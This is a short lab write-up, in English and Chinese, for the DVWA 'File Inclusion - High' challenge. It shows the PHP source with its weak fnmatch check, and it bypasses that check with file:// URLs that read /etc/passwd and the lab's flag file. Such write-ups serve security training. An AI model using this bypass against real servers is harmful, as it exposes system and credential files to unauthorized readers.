# File Inclusion - High

## View Source

```PHP
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation
if( !fnmatch( "file*", $file ) && $file != "include.php" ) {
    // This isn't the page we want!
    echo "ERROR: File not found!";
    exit;
}

?> 
```

- [`fnmatch()`](https://www.php.net/manual/zh/function.fnmatch.php)
    - 檢查傳入的 *filename* 是否符合 *shell wildcard pattern*

## Code Review

- 只要不是 *file* 開頭或是不是 *include.php* 就噴錯

## Answer

- 用 *Low.md* 提到的偽協議來存取檔案系統

### Example

```
http://127.0.0.1/vulnerabilities/fi/?page=file:///etc/passwd
http://127.0.0.1/vulnerabilities/fi/?page=file:///var/www/html/hackable/flags/fi.php
```